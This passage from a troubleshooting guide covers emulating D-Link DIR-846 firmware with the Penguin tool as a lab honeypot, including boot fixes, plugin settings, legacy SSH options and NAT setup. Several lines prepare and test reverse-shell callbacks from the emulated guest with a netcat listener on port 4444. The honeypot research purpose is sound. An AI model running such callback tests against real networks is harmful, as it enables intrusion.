root:$6$salt$hash...    # ✗ SHA-512 (won't work)
```

**Solution:** Regenerate with MD5 (`openssl passwd -1`)

---

#### Issue: "Connection reset" on all services

**Symptoms:**
- TCP handshake succeeds (SYN, SYN-ACK, ACK)
- Immediately followed by RST (reset)
- Happens for all services (HTTP, SSH, telnet)

**Root cause:** `/dev/null` is broken (directory instead of device)

**Check:**
```bash
# Look for error in console
grep "/dev/null" projects/dir846/results/*/console.log

# Should see:
# can't create /dev/null: Is a directory
```

**Solution:** Apply REQ-2 (`/dev/null` fix in `base.yaml`)

---

#### Issue: Boot takes 10+ minutes

**Symptoms:**
- Penguin runs for 10-15 minutes
- Eventually boots successfully
- Services work, but boot is extremely slow

**Root cause:** Full strace enabled without filtering

**Check:**
```bash
# Count strace lines in console
wc -l projects/dir846/results/0/console.log

# If > 100,000 lines → full strace
```

**Solution:** Apply REQ-4 (filtered strace script)

---

#### Issue: Container shuts down after 2 minutes

**Symptoms:**
- Boot completes successfully
- Services start and are accessible
- After ~2 minutes, container stops
- Log shows: "Missing .ran file" or "shutdown_on_www triggered"

**Root cause:** Plugin shutdown triggers enabled

**Check:**
```bash
# Look for shutdown message
docker logs <container> | grep -i shutdown

# Check manual.yaml
grep "shutdown_on_www" projects/dir846/static_patches/manual.yaml
```

**Solution:** Apply REQ-5 (disable shutdown triggers in `manual.yaml`)

---

#### Issue: Services not accessible from network

**Symptoms:**
- Container is running
- No errors in logs
- Services visible in `netbinds.csv`
- But `curl http://192.168.7.50` times out

**Root cause 1:** `CONTAINER_IP` environment variable not set

**Check:**
```bash
docker inspect <container> | grep CONTAINER_IP
```

**Solution:** Add `-e CONTAINER_IP=192.168.7.50` to docker args

**Root cause 2:** VPN plugin not bridging

**Check:**
```bash
# Should show bridges
cat projects/dir846/results/0/vpn_bridges.csv

# Should show VPN process
docker exec <container> ps aux | grep vpn
```

**Solution:** Check `/dev/null` fix, VPN plugin enabled

---

#### Issue: SSH "no matching key exchange" error

**Symptoms:**
```
Unable to negotiate with 192.168.7.50 port 22: no matching key exchange method found.
Their offer: diffie-hellman-group1-sha1,diffie-hellman-group14-sha1
```

**Root cause:** Old dropbear only supports legacy crypto

**Solution:** Use legacy algorithm flags:
```bash
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 \
    -o HostKeyAlgorithms=+ssh-rsa,ssh-dss \
    root@192.168.7.50
```

---

#### Issue: Outbound connectivity not working (reverse shell fails)

**Symptoms:**
- Guest can be accessed from network (HTTP, SSH work)
- But guest cannot connect to internal IPs
- `ping 192.168.7.118` fails with "Network is unreachable"
- `nc 192.168.7.118 4444` times out or connection refused
- Reverse shells fail to connect back

**Root cause 1:** Guest has no IP address or routing

**Check from guest:**
```bash
ssh root@192.168.7.50
ifconfig eth0
# Should show: inet addr:10.0.2.15

route -n
# Should show: default via 10.0.2.2 dev eth0
```

**Solution:** Apply REQ-8 (NAT configuration script). This:
1. Disables `netifd` to prevent network reconfiguration
2. Manually assigns 10.0.2.15 to eth0
3. Adds default route via 10.0.2.2

**Root cause 2:** Missing NET_ADMIN capability for iptables

**Check:**
```bash
docker inspect dir846-honeypot | grep -i cap_add
# Should show: "CapAdd": ["NET_ADMIN"]
```

**Solution:** Add to penguin command:
```bash
--extra_docker_args "--cap-add=NET_ADMIN ..."
```

**Root cause 3:** iptables NAT rules not configured

**Check from inside container:**
```bash
docker exec dir846-honeypot iptables -t nat -L POSTROUTING -n
# Should show: MASQUERADE all -- 10.0.2.0/24 anywhere
```

**Solution:** Verify `95_macvlan_nat.sh` script is:
- Created in `static_patches/`
- Referenced in `config.yaml` under `static_files`
- Executable (`chmod +x`)

**Root cause 4:** netifd reconfiguring network after boot

**Check from guest:**
```bash
ssh root@192.168.7.50
ps | grep netifd
# Should show nothing (netifd disabled)

ifconfig eth0
# Should show 10.0.2.15, NOT 192.168.0.1
```

**Solution:** Script `95_macvlan_nat.sh` disables netifd by:
```bash
killall netifd
mv /sbin/netifd /sbin/netifd.disabled
```

**Debug steps:**
```bash
# 1. Check container can reach network
docker exec dir846-honeypot ping 192.168.7.118
# Should work (container has 192.168.7.50 on macvlan)

# 2. Check SLIRP gateway reachable from guest
ssh root@192.168.7.50 'ping -c 2 10.0.2.2'
# Should work (SLIRP gateway always responds)

# 3. Check physical gateway reachable from guest
ssh root@192.168.7.50 'ping -c 2 192.168.7.1'
# Should work (NAT translates 10.0.2.15 → 192.168.7.50)

# 4. Check target host reachable from guest
ssh root@192.168.7.50 'ping -c 2 192.168.7.118'
# Should work (full connectivity)
```

**Complete working command:**
```bash
penguin \
  --subnet none \
  --name dir846-honeypot \
  --extra_docker_args "--network xwangnet_lan --ip 192.168.7.50 --cap-add=NET_ADMIN -e CONTAINER_IP=192.168.7.50 -e GATEWAY=192.168.7.1" \
  run projects/dir846/config.yaml
```
```

**Solution:** Ensure `plugins.vpn.enabled: true` in manual.yaml

**Test outbound step-by-step:**
```bash
# 1. From host, can you reach container?
ping 192.168.7.50  # Should work

# 2. From container, can you reach host?
docker exec dir846-honeypot ping 192.168.7.118  # Should work

# 3. From guest, can you reach gateway?
ssh root@192.168.7.50 "ping -c 3 192.168.7.1"  # Should work

# 4. From guest, can you reach host?
ssh root@192.168.7.50 "ping -c 3 192.168.7.118"  # Should work

# 5. From guest, can you establish TCP connection?
# On 192.168.7.118: nc -lvnp 4444
ssh root@192.168.7.50 "nc 192.168.7.118 4444"  # Should connect
```

---

## 4. Quick Reference

### File Locations

```
projects/dir846/
├── config.yaml                           # Main configuration
│   ├── core:                             # Network, memory, strace settings
│   ├── static_files:                     # Filtered strace script reference
│   └── plugins:                          # Usually empty (use manual.yaml)
│
├── base/
│   ├── fs.tar.gz                         # Modified rootfs (with password)
│   └── fs.tar.gz.backup                  # Original (before password)
│
├── static_patches/
│   ├── base.yaml                         # /dev/null fix, device files
│   ├── manual.yaml                       # Plugin configs, shutdown disables
│   ├── pseudofiles.dynamic.yaml          # Remove /dev/null placeholder here
│   └── 90_enable_strace_filtered.sh      # Filtered strace script
│
└── results/0/                            # Telemetry output (after first run)
    ├── console.log                       # Full boot log
    ├── vpn_bridges.csv                   # Services exposed
    ├── netbinds.csv                      # Port bindings
    ├── health_procs.txt                  # Processes executed
    └── plugins.db                        # SQLite database (if working)
```

### Key Commands

```bash
# Initialize project
penguin init firmware.tar.gz --output projects/device_name

# Run with XwangNet network
penguin \
  --subnet none \
  --name container_name \
  --extra_docker_args "--network xwangnet_lan --ip 192.168.7.50 -e CONTAINER_IP=192.168.7.50 -e GATEWAY=192.168.7.1" \
  run projects/device_name/config.yaml

# View telemetry
docker logs container_name | grep execve
cat projects/device_name/results/0/console.log

# SSH access
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 \
    -o HostKeyAlgorithms=+ssh-rsa,ssh-dss \
    root@192.168.7.50

# Commit to image
docker commit container_name xwangnet/device_name:v1

# Clean restart
docker stop container_name
docker rm container_name
rm -rf projects/device_name/results/*
# Then run penguin again
```

### Validation Checklist

   ```bash
# 1. Boot time
time penguin ... run config.yaml
# Target: < 3 minutes

# 2. Web server
curl http://192.168.7.50
# Expect: HTTP 200 or 302

# 3. SSH
ssh root@192.168.7.50
# Expect: Password prompt, then shell

# 4. Strace logging
docker logs <container> | grep -c execve
# Expect: 800-1500+ calls

# 5. Services exposed
cat projects/dir846/results/0/vpn_bridges.csv
# Expect: Multiple services listed

# 6. No shutdown
sleep 300 && docker ps | grep <container>
# Expect: Still running after 5 minutes

# 7. No /dev/null errors
grep "/dev/null" projects/dir846/results/0/console.log
# Expect: No "Is a directory" errors

# 8. Outbound connectivity (reverse shell test)
# On 192.168.7.118:
nc -lvnp 4444 &
# On guest:
ssh root@192.168.7.50 "nc 192.168.7.118 4444"
# Expect: Connection established
```

### Configuration Templates

**Minimal config.yaml core section:**
   ```yaml
core:
  fs: ./base/fs.tar.gz
  root_shell: true
  strace: true
  show_output: true
  network: true
  mem: 2G
  kernel_quiet: false
  smp: 1
```

**Minimal manual.yaml plugins section:**
```yaml
plugins:
  netbinds:
    enabled: true
    shutdown_on_www: false
  vpn:
    enabled: true
  health:
    enabled: true
  fetch_web:
    enabled: false
    shutdown_after_www: false
    shutdown_on_failure: false
  ficd:
    enabled: false
    stop_on_if: false
```

**SSH config entry:**
```
Host 192.168.7.*
    KexAlgorithms +diffie-hellman-group1-sha1
    HostKeyAlgorithms +ssh-rsa,ssh-dss
    PubkeyAuthentication no
   ```

---

*End of guide. For updates, see git history.*
